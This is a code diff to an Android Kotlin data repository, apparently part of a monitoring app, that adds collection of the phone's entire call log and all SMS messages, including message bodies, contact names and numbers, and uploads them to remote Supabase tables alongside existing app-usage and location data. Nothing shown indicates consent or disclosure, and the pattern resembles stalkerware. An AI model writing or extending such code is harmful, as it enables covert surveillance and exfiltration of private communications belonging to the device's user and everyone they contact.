@@ -5,6 +5,8 @@ import android.app.usage.UsageEvents
 import android.app.usage.UsageStatsManager
 import android.content.Context
 import android.os.Build
+import android.provider.CallLog
+import android.provider.Telephony
 import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -38,7 +40,6 @@ object LocationRepository {
 
     private val repositoryScope = CoroutineScope(Dispatchers.IO)
 
-    // 统一的时间格式：包含日期、时间和时区
     private fun getSdf() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
 
     fun init(context: Context) {
@@ -59,10 +60,14 @@ object LocationRepository {
         syncUnsyncedApps()
         syncUnsyncedUsage()
         syncUnsyncedSessions()
+        syncUnsyncedCalls()
+        syncUnsyncedSms()
         
         scanAndSaveInstalledApps(context)
         scanAndSaveAppUsage(context)
         scanAndSaveAppSessions(context)
+        scanAndSaveCallLogs(context)
+        scanAndSaveSms(context)
     }
 
     @SuppressLint("MissingPermission")
@@ -104,6 +109,8 @@ object LocationRepository {
                 syncUnsyncedApps()
                 syncUnsyncedUsage()
                 syncUnsyncedSessions()
+                syncUnsyncedCalls()
+                syncUnsyncedSms()
             } catch (e: Exception) {
                 Log.e("LocationRepository", "Failed to create Supabase client: ${e.message}")
                 supabaseClient = null
@@ -233,10 +240,86 @@ object LocationRepository {
         }
     }
 
+    fun scanAndSaveCallLogs(context: Context) {
+        repositoryScope.launch {
+            if (context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
+            
+            val cursor = context.contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null, CallLog.Calls.DATE + " DESC"
+            ) ?: return@launch
+
+            val sdf = getSdf()
+            while (cursor.moveToNext()) {
+                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                val name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
+                val duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                
+                val type = when (typeInt) {
+                    CallLog.Calls.INCOMING_TYPE -> "呼入"
+                    CallLog.Calls.OUTGOING_TYPE -> "呼出"
+                    CallLog.Calls.MISSED_TYPE -> "未接"
+                    else -> "其他"
+                }
+
+                val record = CallRecord(
+                    number = number,
+                    name = name,
+                    type = type,
+                    time = sdf.format(Date(date)),
+                    durationSeconds = duration,
+                    deviceId = currentDeviceId,
+                    deviceName = currentDeviceName
+                )
+                dbHelper?.insertCall(record)
+            }
+            cursor.close()
+            syncUnsyncedCalls()
+        }
+    }
+
+    fun scanAndSaveSms(context: Context) {
+        repositoryScope.launch {
+            if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
+            
+            val cursor = context.contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                null, null, null, Telephony.Sms.DATE + " DESC"
+            ) ?: return@launch
+
+            val sdf = getSdf()
+            while (cursor.moveToNext()) {
+                val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+                
+                val type = when (typeInt) {
+                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "接收"
+                    Telephony.Sms.MESSAGE_TYPE_SENT -> "发送"
+                    else -> "其他"
+                }
+
+                val record = SmsRecord(
+                    address = address,
+                    body = body,
+                    type = type,
+                    time = sdf.format(Date(date)),
+                    deviceId = currentDeviceId,
+                    deviceName = currentDeviceName
+                )
+                dbHelper?.insertSms(record)
+            }
+            cursor.close()
+            syncUnsyncedSms()
+        }
+    }
+
     fun syncUnsyncedApps() {
         repositoryScope.launch {
             val unsynced = dbHelper?.getUnsyncedApps() ?: return@launch
-            if (unsynced.isEmpty()) return@launch
             unsynced.forEach { syncApp(it) }
         }
     }
@@ -256,7 +339,6 @@ object LocationRepository {
     fun syncUnsyncedUsage() {
         repositoryScope.launch {
             val unsynced = dbHelper?.getUnsyncedUsage() ?: return@launch
-            if (unsynced.isEmpty()) return@launch
             unsynced.forEach { syncUsage(it) }
         }
     }
@@ -276,7 +358,6 @@ object LocationRepository {
     fun syncUnsyncedSessions() {
         repositoryScope.launch {
             val unsynced = dbHelper?.getUnsyncedSessions() ?: return@launch
-            if (unsynced.isEmpty()) return@launch
             unsynced.forEach { syncSession(it) }
         }
     }
@@ -288,6 +369,46 @@ object LocationRepository {
             dbHelper?.markSessionSynced(session.id)
         } catch (e: Exception) {
             Log.e("LocationRepository", "Sync session failed for ${session.appName}")
+        }
+    }
+
+    fun syncUnsyncedCalls() {
+        repositoryScope.launch {
+            val unsynced = dbHelper?.getUnsyncedCalls() ?: return@launch
+            unsynced.forEach { syncCall(it) }
+        }
+    }
+
+    private suspend fun syncCall(record: CallRecord) {
+        val client = supabaseClient ?: return
+        try {
+            // 通话记录使用 upsert 避免重复上传同一条记录，假设 (device_id, number, time) 是唯一的
+            client.postgrest.from("call_history").upsert(record) {
+                onConflict = "device_id,number,time"
+            }
+            dbHelper?.markCallSynced(record.id)
+        } catch (e: Exception) {
+            Log.e("LocationRepository", "Sync call failed: ${e.message}")
+        }
+    }
+
+    fun syncUnsyncedSms() {
+        repositoryScope.launch {
+            val unsynced = dbHelper?.getUnsyncedSms() ?: return@launch
+            unsynced.forEach { syncSms(it) }
+        }
+    }
+
+    private suspend fun syncSms(record: SmsRecord) {
+        val client = supabaseClient ?: return
+        try {
+            // 短信记录也使用 upsert，假设 (device_id, address, body, time) 是唯一的
+            client.postgrest.from("sms_history").upsert(record) {
+                onConflict = "device_id,address,body,time"
+            }
+            dbHelper?.markSmsSynced(record.id)
+        } catch (e: Exception) {
+            Log.e("LocationRepository", "Sync sms failed: ${e.message}")
         }
     }
 
